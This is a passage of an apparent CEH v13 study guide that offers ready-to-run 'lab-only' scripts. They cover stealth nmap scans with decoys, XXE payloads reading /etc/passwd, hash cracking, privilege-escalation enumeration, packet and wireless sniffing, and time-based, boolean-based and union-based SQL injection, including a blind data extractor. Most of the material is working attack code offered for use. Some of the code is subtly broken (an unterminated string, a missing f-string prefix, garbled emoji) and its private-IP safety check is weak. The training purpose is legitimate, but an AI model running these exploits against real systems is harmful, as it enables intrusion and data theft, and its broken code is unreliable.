nmap -sn -PR "$LAB_TARGET" -oX "$LAB_OUTPUT_DIR/lab-arp-ping-$TIMESTAMP.xml" -oN "$LAB_OUTPUT_DIR/lab-arp-ping-$TIMESTAMP.nmap"
echo "   Done!"

# 2. SYN Scan with Decoys and Fragmentation
echo "2. Running SYN scan with decoys/fragmentation..."
nmap -sS -f -D RND:5,"$LAB_DECOYS",ME -T2 --data-length 13 -p- --randomize-hosts "$LAB_TARGET" -oX "$LAB_OUTPUT_DIR/lab-syn-stealth-$TIMESTAMP.xml" -oN "$LAB_OUTPUT_DIR/lab-syn-stealth-$TIMESTAMP.nmap"
echo "   Done!"

echo "================================================"
echo "All LAB scans complete! Results in $LAB_OUTPUT_DIR"
echo "================================================"

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 09-stealth-scan-wrapper.sh` for packet capture/port scanning, or `./09-stealth-scan-wrapper.sh` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 255 : XXE (XML External Entity) Injection Tester

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: XXE (XML External Entity) Injection Tester

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: XXE (XML External Entity) Injection Tester
# CEH v13 Master Module 14
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/xxe.php"  # YOUR lab XXE endpoint
LAB_POST_PARAM = "xml"  # The parameter that accepts XML
LAB_XML_PAYLOADS = [
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/hostname" >]>
<foo>&xxe;</foo>''',
    '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini" >]>
<foo>&xxe;</foo>'''
]
LAB_CHECK_STR = "root:x:"  # Linux check; change for Windows
# -----------------------------------------------------------------------------------

def test_xxe(url, param, payload):
    try:
        files = {param: (None, payload, "application/xml")}
        response = requests.post(url, files=files, timeout=5, verify=False)
        # OR use data=payload if endpoint expects raw XML
        # response = requests.post(url, data=payload, headers={"Content-Type": "application/xml"}, timeout=5, verify=False)
        if LAB_CHECK_STR.lower() in response.text.lower() or "Windows" in response.text:
            return True, response.text
        return False, response.text
    except Exception as e:
        return False, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: XXE Injection Tester")
    print("="*80)
    print(f"Target URL: {LAB_TARGET_URL}")
    print("-"*80)
    for i, payload in enumerate(LAB_XML_PAYLOADS, 1):
        print(f"Testing payload {i}...")
        vulnerable, resp = test_xxe(LAB_TARGET_URL, LAB_POST_PARAM, payload)
        status = "ðŸ”´ VULNERABLE" if vulnerable else "ðŸŸ¢ NOT Detected"
        print(f"Status: {status}")
        if vulnerable:
            print(f"Response snippet: {resp[:300]}...")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Private targets only!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings()
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 10-xxe-tester.py` for packet capture/port scanning, or `./10-xxe-tester.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 256 : Hash Cracking Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Hash Cracking Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```bash
﻿#!/bin/bash
# LAB-ONLY: Hash Cracking Helper
# CEH v13 Master Module 06,07
# STRICTLY FOR AUTHORIZED LAB USE ONLY!

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_HASHES_FILE="$HOME/lab-hashes.txt"         # YOUR hashes file
LAB_WORDLIST="/usr/share/wordlists/rockyou.txt" # YOUR wordlist
LAB_HASHTYPE="0"  # 0 = MD5, 1000 = NTLM, 1400 = SHA256, 500 = MD5Crypt (see hashcat --help)
# -----------------------------------------------------------------------------------

echo "================================================"
echo "LAB-ONLY: Hash Cracking Helper"
echo "Hashes file: $LAB_HASHES_FILE"
echo "Wordlist: $LAB_WORDLIST"
echo "Hash type (hashcat mode): $LAB_HASHTYPE"
echo "================================================"
echo "1. Trying hashcat first..."
hashcat -m "$LAB_HASHTYPE" -a 0 -O "$LAB_HASHES_FILE" "$LAB_WORDLIST"
echo " "
echo "2. If hashcat didn't work, trying John the Ripper..."
john --format=raw-md5 --wordlist="$LAB_WORDLIST" "$LAB_HASHES_FILE"  # Edit format as needed
echo " "
echo "3. Showing John results..."
john --show "$LAB_HASHES_FILE"
echo "================================================"

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 11-hash-crack-helper.sh` for packet capture/port scanning, or `./11-hash-crack-helper.sh` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 257 : Linux PrivEsc Enumeration Wrapper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Linux PrivEsc Enumeration Wrapper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```bash
﻿#!/bin/bash
# LAB-ONLY: Linux PrivEsc Enumeration Wrapper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_OUTPUT_DIR="$HOME/lab-privesc-enum"
# -----------------------------------------------------------------------------------

mkdir -p "$LAB_OUTPUT_DIR"
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTFILE="$LAB_OUTPUT_DIR/lab-privesc-enum-$TIMESTAMP.log"

echo "================================================" | tee -a "$OUTFILE"
echo "LAB-ONLY: Linux Privilege Escalation Enumeration" | tee -a "$OUTFILE"
echo "================================================" | tee -a "$OUTFILE"

echo "1. Checking kernel/OS version..." | tee -a "$OUTFILE"
uname -a >> "$OUTFILE" 2>&1
cat /etc/os-release >> "$OUTFILE" 2>&1
echo "" | tee -a "$OUTFILE"

echo "2. Checking SUID/SGID binaries..." | tee -a "$OUTFILE"
find / -perm -4000 -type f 2>/dev/null >> "$OUTFILE"
find / -perm -2000 -type f 2>/dev/null >> "$OUTFILE"
echo "" | tee -a "$OUTFILE"

echo "3. Checking writable directories/files..." | tee -a "$OUTFILE"
find / -writable -type f 2>/dev/null | head -50 >> "$OUTFILE"
echo "" | tee -a "$OUTFILE"

echo "4. Checking cron jobs..." | tee -a "$OUTFILE"
ls -la /etc/cron* >> "$OUTFILE" 2>&1
cat /etc/crontab >> "$OUTFILE" 2>&1
echo "" | tee -a "$OUTFILE"

echo "Done! Full log saved to $OUTFILE"

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 12-linux-privesc-enum.sh` for packet capture/port scanning, or `./12-linux-privesc-enum.sh` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 258 : Windows Privilege Escalation Enumeration Helper

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Windows Privilege Escalation Enumeration Helper

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```batch
﻿@echo off
:: LAB-ONLY: Windows Privilege Escalation Enumeration Helper
:: CEH v13 Master Module 06
:: STRICTLY FOR AUTHORIZED LAB USE ONLY!

REM -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
set LAB_OUTPUT_DIR=C:\Windows\Temp\lab-privesc
REM -----------------------------------------------------------------------------------

mkdir "%LAB_OUTPUT_DIR%" 2>nul
set TIMESTAMP=%date:~-4%%date:~4,2%%date:~7,2%_%time:~0,2%%time:~3,2%%time:~6,2%
set OUTFILE=%LAB_OUTPUT_DIR%\lab-privesc-enum-%TIMESTAMP%.txt

echo ================================================ >> "%OUTFILE%"
echo LAB-ONLY: Windows PrivEsc Enumeration >> "%OUTFILE%"
echo ================================================ >> "%OUTFILE%"

echo 1. System Info... >> "%OUTFILE%"
systeminfo >> "%OUTFILE%"
echo. >> "%OUTFILE%"

echo 2. Users and Groups... >> "%OUTFILE%"
net user >> "%OUTFILE%"
net localgroup administrators >> "%OUTFILE%"
echo. >> "%OUTFILE%"

echo 3. Services... >> "%OUTFILE%"
sc query state= all >> "%OUTFILE%"
echo. >> "%OUTFILE%"

echo Done! Output saved to %OUTFILE%
pause

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 13-windows-privesc-enum.bat` for packet capture/port scanning, or `./13-windows-privesc-enum.bat` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 259 : Simple Packet Sniffer (Scapy)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Simple Packet Sniffer (Scapy)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Simple Packet Sniffer (Scapy)
# CEH v13 Master Module 08
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
from scapy.all import sniff, IP, TCP, UDP
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_INTERFACE = "eth0"  # YOUR lab interface (eth0, wlan0, etc.)
LAB_PACKET_COUNT = 100  # Number of packets to capture (0 = infinite)
LAB_FILTER = ""         # Optional: BPF filter (e.g., "tcp port 80", "host 192.168.100.10")
# -----------------------------------------------------------------------------------

def packet_callback(packet):
    if IP in packet:
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst
        proto = packet[IP].proto
        print(f"[+] {src_ip} -> {dst_ip} (Proto: {proto})")
        if TCP in packet:
            print(f"    TCP: {packet[TCP].sport} -> {packet[TCP].dport} Flags: {packet[TCP].flags}")
        elif UDP in packet:
            print(f"    UDP: {packet[UDP].sport} -> {packet[UDP].dport}")

def main():
    print("="*80)
    print("LAB-ONLY: Simple Scapy Packet Sniffer")
    print(f"Interface: {LAB_INTERFACE}, Count: {LAB_PACKET_COUNT}")
    print("="*80)
    print("Starting capture (press Ctrl+C to stop)...")
    try:
        sniff(iface=LAB_INTERFACE, prn=packet_callback, count=LAB_PACKET_COUNT, filter=LAB_FILTER)
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure scapy is installed: pip install scapy")
        print("And run with sudo/root!")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 14-scapy-sniffer.py` for packet capture/port scanning, or `./14-scapy-sniffer.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 260 : Wireless Network Scanner (Scapy)

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Wireless Network Scanner (Scapy)

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
﻿#!/usr/bin/env python3
# LAB-ONLY: Wireless Network Scanner (Scapy)
# CEH v13 Master Module 16
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
from scapy.all import sniff, Dot11, Dot11Beacon, Dot11Elt
import sys, time

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_WIRELESS_INTERFACE = "wlan0mon"  # YOUR lab monitor interface (must be in monitor mode!)
LAB_SCAN_TIME = 30  # Scan for N seconds
# -----------------------------------------------------------------------------------

networks = {}

def packet_callback(packet):
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2
        ssid = packet[Dot11Elt].info.decode()
        stats = packet[Dot11Beacon].network_stats()
        channel = stats.get("channel")
        crypto = stats.get("crypto")
        if bssid not in networks:
            networks[bssid] = {"ssid": ssid, "channel": channel, "crypto": crypto}
            print(f"[+] Found: BSSID={bssid} SSID='{ssid}' Ch={channel} Crypto={crypto}")

def main():
    print("="*80)
    print("LAB-ONLY: Wireless Network Scanner")
    print(f"Interface: {LAB_WIRELESS_INTERFACE}, Scan Time: {LAB_SCAN_TIME}s")
    print("="*80)
    print("Starting scan...")
    try:
        sniff(iface=LAB_WIRELESS_INTERFACE, prn=packet_callback, timeout=LAB_SCAN_TIME)
    except Exception as e:
        print(f"Error: {e}")
        print("Make sure interface is in monitor mode!")
        print("(Use airmon-ng start wlan0 to create wlan0mon)")

if __name__ == "__main__":
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 15-wireless-scanner.py` for packet capture/port scanning, or `./15-wireless-scanner.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 261 : Time-Based Blind SQL Injection Testing

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Time-Based Blind SQL Injection Testing

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Time-Based SQL Injection Tester
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: This script tests for time-based blind SQL injection by injecting
# introducing delays (SLEEP, WAITFOR, etc.) and measuring response time differences!
import requests
import sys
import time

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
# 1. LAB_TARGET_URL: Change this to YOUR lab's vulnerable URL (e.g., http://192.168.100.10/vuln.php?id=)
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="
# 2. LAB_BASE_DELAY: How many seconds the payload should delay (e.g., 5 = 5 seconds)
LAB_BASE_DELAY = 5
# 3. LAB_PAYLOAD_TEMPLATES: Templates for different DBMS (MySQL, PostgreSQL, SQL Server)
LAB_PAYLOAD_TEMPLATES = {
    "MySQL": [
        "' AND SLEEP({delay}) -- ",
        "'; SLEEP({delay}) -- ",
        "' OR SLEEP({delay}) -- "
    ],
    "PostgreSQL": [
        "' AND PG_SLEEP({delay}) -- ",
        "'; PG_SLEEP({delay}) -- "
    ],
    "SQL Server": [
        "'; WAITFOR DELAY '0:0:{delay}' -- ",
        "' AND WAITFOR DELAY '0:0:{delay}' -- "
    ]
}
# 4. LAB_THRESHOLD: If response takes > (delay + 1 seconds), mark as vulnerable
LAB_THRESHOLD = 1
# -----------------------------------------------------------------------------------

def test_time_delay(url, payload_template, delay):
    payload = payload_template.format(delay=delay)
    full_url = f"{url}{payload}"
    try:
        start = time.time()
        response = requests.get(full_url, timeout=delay + 5, verify=False)  # Lab-only: verify=False
        end = time.time()
        response_time = end - start
        return response_time, response.status_code
    except requests.exceptions.Timeout:
        return delay + 10, 408  # If timeout, assume delay worked!
    except Exception as e:
        return 0, str(e)

def main():
    print("="*80)
    print("LAB-ONLY: Time-Based Blind SQL Injection Tester")
    print("="*80)
    print(f"[*] Target URL: {LAB_TARGET_URL}")
    print(f"[*] Base Delay: {LAB_BASE_DELAY} seconds")
    print("-"*80)
    for dbms, templates in LAB_PAYLOAD_TEMPLATES.items():
        print(f"\n[*] Testing {dbms} payloads...")
        for template in templates:
            resp_time, status = test_time_delay(LAB_TARGET_URL, template, LAB_BASE_DELAY)
            is_vulnerable = resp_time >= (LAB_BASE_DELAY + LAB_THRESHOLD)
            status_str = "🔴 VULNERABLE (Time-Based)" if is_vulnerable else "🟢 Not Vulnerable"
            print(f"Payload: {template:<60} | Time: {resp_time:.2f}s | {status_str}")
            if is_vulnerable:
                print(f"   -> Tested with {dbms} payload!")

if __name__ == "__main__":
    # Quick lab validation: Check if target URL is private lab IP
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: This script is LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 16-time-based-sqli.py` for packet capture/port scanning, or `./16-time-based-sqli.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 262 : Boolean-Based Blind SQL Injection Data Extraction

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Boolean-Based Blind SQL Injection Data Extraction

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Boolean-Based Blind SQL Injection Extractor
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Extracts data character by character using boolean-based blind SQLi!
# Uses binary search to speed up extraction!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="
LAB_TRUE_INJECTION_POINT = "' AND (SELECT SUBSTRING((SELECT database()),1,1)='a' -- "
LAB_TRUE_INDICATOR = "Welcome Admin"  # What appears in page if true
# Example queries:
LAB_QUERY_TEMPLATE = "' AND ASCII(SUBSTRING(({query}),{pos},1))>{char}) -- "
LAB_TARGET_QUERY = "SELECT database()"  # Change to what you want (e.g., SELECT user(), SELECT version())
# -----------------------------------------------------------------------------------

def test_condition(payload):
    full_url = f"{LAB_TARGET_URL}{payload}"
    try:
        response = requests.get(full_url, timeout=5, verify=False)
        return LAB_TRUE_INDICATOR in response.text
    except Exception as e:
        print(f"Error: {e}")
        return False

def extract_length(query):
    length = 0
    while True:
        # Test if length > X
        payload = f"' AND (SELECT LENGTH(({query})))>{length} -- "
        if test_condition(payload):
            length += 1
        else:
            break
    print(f"[+] Extracted length: {length}")
    return length

def extract_data(query, length):
    result = ""
    for pos in range(1, length+1):
        # Binary search for each character
        low = 32
        high = 126
        while low <= high:
            mid = (low + high) // 2
            payload = f"' AND ASCII(SUBSTRING(({query}),{pos},1))>{mid} -- "
            if test_condition(payload):
                low = mid + 1
            else:
                high = mid - 1
        result += chr(low)
        print(f"[+] Extracted so far: {result}", end="\r")
    print("\n[+] Final result: {result}")
    return result

def main():
    print("="*80)
    print("LAB-ONLY: Boolean-Based Blind SQL Injection Extractor")
    print("="*80)
    print(f"[*] Target URL: {LAB_TARGET_URL}")
    print("-"*80")
    length = extract_length(LAB_TARGET_QUERY)
    extract_data(LAB_TARGET_QUERY, length)

if __name__ == "__main__":
    # LAB validation
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

> [!TIP]
> **Step-by-Step Usage Guide**
> 
> | Step | Action |
> |:-----|:-------|
> | **1. Prerequisites** | Python 3 or appropriate runtime (check script shebang) installed. Required dependencies (like requests, scapy if used). Root/administrator privileges as needed for packet capture, port scanning, etc. |
> | **2. When to use** | During authorized lab-based security assessments, penetration testing practice, or ethical hacking training for the specific technique this script addresses. |
> | **3. Edit configuration** | Open the script and modify the configuration variables at the top (like LAB_TARGET_URL, LAB_TARGET_IP, etc.) to match your lab environment. |
> | **4. Run the script** | Execute the script with appropriate permissions (e.g., `sudo python3 17-blind-sqli-extractor.py` for packet capture/port scanning, or `./17-blind-sqli-extractor.py` for shell scripts after `chmod +x`). |
> | **5. Interpret output** | Read the console output carefully; the script is designed to provide clear status updates and results for lab use. |
> | **6. Next step** | Use the information or results from this script to proceed with further lab-based assessment steps, following your training plan or lab guide. |

---

## Section 263 : Union-Based SQL Injection Exploitation

> [!WARNING]
> ALL CONTENT IN THIS SECTION IS STRICLY LAB-ONLY! DO NOT USE AGAINST ANY SYSTEM YOU DO NOT OWN OR HAVE EXPLICIT WRITTEN PERMISSION TO TEST!

### Custom Automation Script: Union-Based SQL Injection Exploitation

**Explanation**: This script is designed for use in controlled lab environments as part of authorized security assessments and training. It follows ethical hacking practices and includes safety checks to ensure it only targets private lab IP ranges.

```python
#!/usr/bin/env python3
# LAB-ONLY: Union-Based SQL Injection Exploiter
# CEH v13 Master Module 15
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Automates finding number of columns, data type checks, and data extraction!
import requests
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_TARGET_URL = "http://192.168.100.10/vuln.php?id="
LAB_START_COLUMNS_MAX = 20
# -----------------------------------------------------------------------------------

def find_columns():
    print("[*] Finding number of columns...")
    for columns in range(1, LAB_START_COLUMNS_MAX+1):
        # First test ORDER BY
        payload_order = f"' ORDER BY {columns} -- "
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload_order}", timeout=5, verify=False)
            if "Unknown column" not in resp.text and "syntax" not in resp.text.lower():
                continue
            else:
                # Wait, let's try UNION SELECT
                break
        except:
            pass
    # Now try UNION SELECT
    for columns in range(1, LAB_START_COLUMNS_MAX+1):
        payload_union = f"' UNION SELECT " + ",".join(["NULL"]*columns) + " -- "
        try:
            resp = requests.get(f"{LAB_TARGET_URL}{payload_union}", timeout=5, verify=False)
            if "syntax" not in resp.text.lower():
                print(f"[+] Found {columns} columns!")
                return columns
        except Exception as e:
            pass
    return None

def main():
    print("="*80)
    print("LAB-ONLY: Union-Based SQL Injection Exploiter")
    print("="*80)
    cols = find_columns()
    if cols:
        print(f"[+] Proceeding with {cols} columns. Now customize payloads:")
        print(f"   - Try replacing NULLs with numbers/strings to find injectable positions!")
        print(f"   - Example payloads (replace {cols} columns:")
        print(f"   ' UNION SELECT 1,2,3,4,... -- ")
        print(f"   ' UNION SELECT @@version,user(),database(),... -- ")

if __name__ == "__main__":
    if not any(prefix in LAB_TARGET_URL for prefix in ["10.", "172.16.", "172.17.", "172.18.", "172.19.", "172.20.", "172.21.", "172.22.", "172.23.", "172.24.", "172.25.", "172.26.", "172.27.", "172.28.", "172.29.", "172.30.", "172.31.", "192.168.", "localhost", "127.0.0.1"]):
        print("ERROR: LAB-ONLY! Use only private lab targets!")
        sys.exit(1)
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    main()

```

